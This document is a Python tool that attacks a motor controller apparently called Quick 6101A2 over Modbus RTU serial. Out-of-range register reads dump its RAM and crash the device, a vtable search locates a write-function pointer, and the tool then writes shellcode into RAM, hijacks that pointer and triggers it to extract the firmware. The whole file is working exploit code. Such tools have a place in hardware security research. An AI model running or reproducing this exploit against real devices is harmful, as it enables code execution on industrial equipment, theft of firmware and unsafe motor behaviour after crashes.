#!/usr/bin/env python3
import argparse
import struct
import sys
import time
import re

try:
    import serial
except ImportError as exc:
    raise SystemExit("pyserial is required: pip install pyserial") from exc


def crc16_modbus(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return crc & 0xFFFF


COLOR_RESET = "\033[0m"
COLOR_GREEN = "\033[32m"
COLOR_RED = "\033[31m"
COLOR_YELLOW = "\033[33m"


def supports_color() -> bool:
    return sys.stdout.isatty()


def colorize(text: str, color: str) -> str:
    if not supports_color():
        return text
    return f"{color}{text}{COLOR_RESET}"


def format_tag(tag: str, color: str) -> str:
    return colorize(tag, color)


def log_ok(msg: str, end: str = "\n", flush: bool = False) -> None:
    print(f"{format_tag('[+]', COLOR_GREEN)} {msg}", end=end, flush=flush)


def log_detail(msg: str, end: str = "\n", flush: bool = False) -> None:
    print(f"{format_tag('[*]', COLOR_YELLOW)} {msg}", end=end, flush=flush)


def log_error(msg: str, end: str = "\n", flush: bool = False) -> None:
    print(f"{format_tag('[-]', COLOR_RED)} {msg}", end=end, flush=flush)


def build_fc03_request(device_id: int, start_addr: int, quantity: int) -> bytes:
    if not (0 <= device_id <= 247):
        raise ValueError("device_id must be 0..247")
    if not (0 <= start_addr <= 0xFFFF):
        raise ValueError("start_addr must be 0..65535")
    if not (1 <= quantity <= 125):
        raise ValueError("quantity must be 1..125")
    pdu = struct.pack(">BHH", 0x03, start_addr, quantity)
    adu = struct.pack(">B", device_id) + pdu
    crc = crc16_modbus(adu)
    return adu + struct.pack("<H", crc)


def build_fc06_request(device_id: int, reg_addr: int, value: int) -> bytes:
    if not (0 <= device_id <= 247):
        raise ValueError("device_id must be 0..247")
    if not (0 <= reg_addr <= 0xFFFF):
        raise ValueError("reg_addr must be 0..65535")
    if not (0 <= value <= 0xFFFF):
        raise ValueError("value must be 0..65535")
    pdu = struct.pack(">BHH", 0x06, reg_addr, value)
    adu = struct.pack(">B", device_id) + pdu
    crc = crc16_modbus(adu)
    return adu + struct.pack("<H", crc)


def parse_fc03_response(resp: bytes, device_id: int) -> list[int]:
    if len(resp) < 5:
        raise ValueError("response too short")
    if resp[0] != device_id:
        raise ValueError("unexpected device id")
    if resp[1] & 0x80:
        raise ValueError(f"exception response: 0x{resp[2]:02x}")
    if resp[1] != 0x03:
        raise ValueError("unexpected function code")
    byte_count = resp[2]
    if len(resp) != 3 + byte_count + 2:
        raise ValueError("response length mismatch")
    data = resp[:-2]
    crc_expected = struct.unpack("<H", resp[-2:])[0]
    crc_actual = crc16_modbus(data)
    if crc_actual != crc_expected:
        raise ValueError("CRC mismatch")
    if byte_count % 2:
        raise ValueError("odd byte count")
    regs = []
    for i in range(0, byte_count, 2):
        regs.append(struct.unpack(">H", resp[3 + i:5 + i])[0])
    return regs


def parse_fc06_response(resp: bytes, device_id: int, reg_addr: int, value: int) -> None:
    if len(resp) != 8:
        raise ValueError("response length mismatch")
    if resp[0] != device_id:
        raise ValueError("unexpected device id")
    if resp[1] & 0x80:
        raise ValueError(f"exception response: 0x{resp[2]:02x}")
    if resp[1] != 0x06:
        raise ValueError("unexpected function code")
    data = resp[:-2]
    crc_expected = struct.unpack("<H", resp[-2:])[0]
    crc_actual = crc16_modbus(data)
    if crc_actual != crc_expected:
        raise ValueError("CRC mismatch")
    addr_echo, value_echo = struct.unpack(">HH", resp[2:6])
    if addr_echo != reg_addr or value_echo != value:
        raise ValueError("echo mismatch")


def read_exact(ser: serial.Serial, length: int, timeout: float) -> bytes:
    deadline = time.time() + timeout
    buf = bytearray()
    while len(buf) < length and time.time() < deadline:
        chunk = ser.read(length - len(buf))
        if chunk:
            buf.extend(chunk)
    return bytes(buf)


def read_fc03_regs(
    ser: serial.Serial,
    device_id: int,
    start_index: int,
    count: int,
    timeout: float,
) -> list[int]:
    request = build_fc03_request(device_id, start_index, count)
    ser.reset_input_buffer()
    ser.write(request)
    ser.flush()

    expected_len = 5 + count * 2
    resp = read_exact(ser, expected_len, timeout)
    if len(resp) < expected_len:
        raise SystemExit(f"timeout: got {len(resp)} bytes, expected {expected_len}")
    return parse_fc03_response(resp, device_id)


def write_fc06_reg(
    ser: serial.Serial,
    device_id: int,
    reg_addr: int,
    value: int,
    timeout: float,
) -> None:
    request = build_fc06_request(device_id, reg_addr, value)
    ser.reset_input_buffer()
    ser.write(request)
    ser.flush()

    resp = read_exact(ser, 8, timeout)
    if len(resp) < 8:
        raise SystemExit(f"timeout: got {len(resp)} bytes, expected 8")
    parse_fc06_response(resp, device_id, reg_addr, value)


def hexdump(data: bytes, base_addr: int) -> None:
    for offset in range(0, len(data), 16):
        chunk = data[offset:offset + 16]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        print(f"{base_addr + offset:08X}: {hex_part:<47}  {ascii_part}")


def parse_hex_data(hex_str: str) -> bytes:
    cleaned = "".join(hex_str.split())
    if len(cleaned) % 2 != 0:
        raise SystemExit("hex data must have even length")
    try:
        return bytes.fromhex(cleaned)
    except ValueError as exc:
        raise SystemExit("invalid hex data") from exc


def addr_to_index(addr: int, base_addr: int) -> int:
    if addr < base_addr:
        raise SystemExit(f"write address must be >= 0x{base_addr:08x}")
    if addr % 2 != 0:
        raise SystemExit("write address must be 16-bit aligned")
    return (addr - base_addr) // 2


def write_payload(
    ser: serial.Serial,
    device_id: int,
    payload: bytes,
    addr: int,
    base_addr: int,
    timeout: float,
) -> None:
    start_index = addr_to_index(addr, base_addr)
    if start_index < 0x14:
        raise SystemExit("write start_index must be >= 0x14")
    for i in range(0, len(payload), 2):
        value = payload[i] | (payload[i + 1] << 8)
        write_fc06_reg(ser, device_id, start_index + (i // 2), value, timeout)
    log_ok(f"Wrote {len(payload)} bytes starting at 0x{addr:08x}")

def find_base(
    ser: serial.Serial,
    device: int,
    ram_start_addr: int,
    ram_size: int,
    timeout: float,
):
    idx = 0
    content = bytearray()
    while(True):
        try:
            reg = read_fc03_regs(ser, device, idx, 1, timeout)
            content.extend(struct.pack("<H", reg[0]))
            idx += 1
        except SystemExit:
            break
        log_detail(f"Peaking RAM: 0x{idx:04x}...\r", end="")
    print()
    log_ok("Reached the end of RAM")

    # After succesfull crash, the device restart, so lets turn the motor off
    for i in range(3, -1, -1):
        log_ok(f"Waiting the device to restart: {i}\r", end="")
        time.sleep(1)

    print()
    log_ok("Turn off the motor")
    write_fc06_reg(ser, device, 0, 0, timeout)

    last_good_idx = idx - 1
    register_map_base = (ram_start_addr + ram_size - 2) - last_good_idx * 2

    vtable_pattern = b'\x00\x00\x00..\x00\x08(..\x00\x08)..\x00\x08.\x00\x00\x00'
    candidates = list(re.finditer(vtable_pattern, content))
    if (len(candidates) > 1):
        raise SystemExit("find more than one candidate for the settings vtable")
    elif (len(candidates) == 0):
        raise SystemExit("did not find the settings vtable")

    (write_ptr_offset, _) = candidates[0].span(1)
    write_ptr_addr = register_map_base + write_ptr_offset

    return (register_map_base, write_ptr_addr, content)


def main() -> int:
    parser = argparse.ArgumentParser(description="Play around with Quick 6101A2")
    parser.add_argument("--port", default="/dev/ttyUSB0", help="Serial port, e.g. /dev/ttyUSB0 ")
    parser.add_argument("--baud", type=int, default=19200, help="Baud rate")
    parser.add_argument("--device", type=int, default=2, help="Device ID")
    parser.add_argument("--timeout", type=float, default=1.0, help="Read timeout seconds")
    parser.add_argument(
        "--base-addr",
        type=lambda x: int(x, 0),
        default=0x2000412C,
        help="Base register map address",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    mem_read_parser = subparsers.add_parser("read", help="Read RAM")
    mem_read_parser.add_argument("--addr", type=lambda x: int(x, 0), required=True, help="RAM address")
    mem_read_parser.add_argument("--size", type=lambda x: int(x, 0), required=True, help="Dump size in bytes")
    mem_read_parser.add_argument("-o", "--output", help="Write raw bytes to file")

    mem_write_parser = subparsers.add_parser("write", help="Write RAM")
    mem_write_parser.add_argument("--addr", type=lambda x: int(x, 0), required=True, help="RAM start address")
    mem_write_parser.add_argument("--data", help="Hex-encoded data to write")
    mem_write_parser.add_argument("-i", "--input", help="Binary input file")

    regs_parser = subparsers.add_parser("read-regs", help="Read holding registers (FC03)")
    regs_parser.add_argument("--addr", type=lambda x: int(x, 0), default=0, help="Start address")
    regs_parser.add_argument("--count", type=int, default=1, help="Register count")

    write_parser = subparsers.add_parser("write-reg", help="Write single register (FC06)")
    write_parser.add_argument("--addr", type=lambda x: int(x, 0), required=True, help="Register address")
    write_parser.add_argument("--value", type=lambda x: int(x, 0), required=True, help="Register value")

    catch_parser = subparsers.add_parser("trigger", help="Trigger the EEPROM write function")
    catch_parser.add_argument("-o", "--output", help="Write raw bytes to file")

    find_base_parser = subparsers.add_parser("find-base", help="Find the register map base address")
    find_base_parser.add_argument(
        "--ram-start-addr",
        type=lambda x: int(x, 0),
        default=0x20000000,
        help="RAM base address",
    )
    find_base_parser.add_argument(
        "--ram-size",
        type=lambda x: int(x, 0),
        default=0x5000,
        help="RAM size in bytes",
    )

    auto_extract = subparsers.add_parser("auto-extract", help="Automatically extract the firmware")
    auto_extract.add_argument(
        "--ram-start-addr",
        type=lambda x: int(x, 0),
        default=0x20000000,
        help="RAM base address",
    )
    auto_extract.add_argument(
        "--ram-size",
        type=lambda x: int(x, 0),
        default=0x5000,
        help="RAM size in bytes",
    )
    auto_extract.add_argument("--payload", default="payload.bin", help="Dumper shellcode")
    auto_extract.add_argument("-o", "--output", default="out.bin", help="Write raw bytes to file")

    args = parser.parse_args()

    base_addr = args.base_addr
    if args.command == "read":
        if args.addr < base_addr:
            raise SystemExit(f"dump address must be >= 0x{base_addr:08x}")
        if args.addr % 2 != 0:
            raise SystemExit("dump address must be 16-bit aligned")
        if args.size <= 0:
            raise SystemExit("size must be > 0")
    if args.command == "write":
        if (args.data is None) == (args.input is None):
            raise SystemExit("provide exactly one of --data or --input")

    with serial.Serial(
        port=args.port,
        baudrate=args.baud,
        bytesize=serial.EIGHTBITS,
        parity=serial.PARITY_NONE,
        stopbits=serial.STOPBITS_ONE,
        timeout=0.1,
    ) as ser:
        if args.command == "read":
            total = args.size
            idx = args.addr
            out = bytearray()
            while total > 0:
                regs_needed = (total + 1) // 2
                regs_this = min(0x20, regs_needed)
                start_index = (idx - base_addr) // 2
                regs = read_fc03_regs(ser, args.device, start_index, regs_this, args.timeout)
                for r in regs:
                    out.extend(struct.pack("<H", r))
                idx += regs_this * 2
                total -= regs_this * 2
            out = out[:args.size]
            data = bytes(out)
            hexdump(data, args.addr)
            if args.output:
                with open(args.output, "wb") as f:
                    f.write(data)
        elif args.command == "read-regs":
            regs = read_fc03_regs(ser, args.device, args.addr, args.count, args.timeout)
            for i, val in enumerate(regs):
                print(f"{args.addr + i}: {val:04x}")
        elif args.command == "write-reg":
            write_fc06_reg(ser, args.device, args.addr, args.value, args.timeout)
            print(f"{args.addr}: {args.value:04x}")
        elif args.command == "write":
            if args.data is not None:
                payload = parse_hex_data(args.data)
            else:
                with open(args.input, "rb") as f:
                    payload = f.read()
            if len(payload) == 0:
                raise SystemExit("no data to write")
            if len(payload) % 2 != 0:
                raise SystemExit("data length must be even (16-bit aligned)")

            write_payload(ser, args.device, payload, args.addr, base_addr, args.timeout)
        elif args.command == "trigger":
            log_ok("Triggering")
            request = build_fc06_request(args.device, 0x000a, 0x01)
            ser.reset_input_buffer()

            with open(args.output, "wb") as f:
                ser.write(request)
                ser.flush()

                cnt = 0
                while(1):
                    cnt = cnt + 1
                    b = ser.read(1)
                    f.write(b)
                    if b == b'':
                        break
                    log_detail(f"Reading: 0x{cnt:04x}...\r", end="")
                print()
                log_ok("Done")
                log_ok(f"Dump stored: {args.output}")
        elif args.command == "find-base":
            (register_map_base, write_ptr_addr, _) = find_base(ser, args.device, args.ram_start_addr, args.ram_size, args.timeout)

            log_ok(f"Register map base: 0x{register_map_base:08x}")
            log_ok(f"Write ptr address: 0x{write_ptr_addr:08x}")

        elif args.command == "auto-extract":
            dumper = open(args.payload, "rb").read()

            log_ok("Dumping the content of RAM to find the settings vtable")
            (register_map_base, write_ptr_addr, ram_content) = find_base(ser, args.device, args.ram_start_addr, args.ram_size, args.timeout)

            log_ok(f"Register map base: 0x{register_map_base:08x}")
            log_ok(f"Write ptr address: 0x{write_ptr_addr:08x}")

            prefix = 13 * b"..\x00\x08" + b"........"
            shellcode_spot = re.search(prefix + len(dumper) * b"\x00", ram_content) 
            if (shellcode_spot == None):
                raise SystemExit("Could not find space for the payload")
            (shellcode_spot_offset, _) = shellcode_spot.span(0)
            shellcode_spot_offset += len(prefix)

            shellcode_spot_addr = register_map_base + shellcode_spot_offset
            if (shellcode_spot_addr % 2 != 0):
                shellcode_spot_addr += 1

            log_ok(f"Found an empty space for the shellcode: 0x{shellcode_spot_addr:08x}")

            answer = input(
                f"{format_tag('[+]', COLOR_GREEN)} Will write the shellcode at 0x{shellcode_spot_addr:08x}\n"
                f"    and patch write ptr at 0x{write_ptr_addr:08x}. Continue? [yN]: "
            )
            if (answer.lower() != "y"):
                log_error("Aborting the mission")
                return 1

            log_ok("Writing the extraction shellcode")
            write_payload(ser, args.device, dumper, shellcode_spot_addr, register_map_base, args.timeout)

            log_ok("Patching the write function ptr")
            new_write = struct.pack("<I", shellcode_spot_addr + 1)
            write_payload(ser, args.device, new_write, write_ptr_addr, register_map_base, args.timeout)

            log_ok("Triggering the write func")
            request = build_fc06_request(args.device, 0x000a, 0x01)
            ser.reset_input_buffer()

            with open(args.output, "wb") as f:
                ser.write(request)
                ser.flush()

                cnt = 0
                while(1):
                    cnt = cnt + 1
                    b = ser.read(1)
                    f.write(b)
                    if b == b'':
                        if (cnt == 1):
                            print()
                            log_error("failed to extract the firmware")
                            return 1
                        break
                    log_detail(f"Reading: 0x{cnt:04x}...\r", end="")
                print()
                log_ok("Done")
                log_ok(f"Dump stored: {args.output}")
            log_ok("Turn the device off to remove the shellcode")

    return 0


if __name__ == "__main__":
    sys.exit(main())
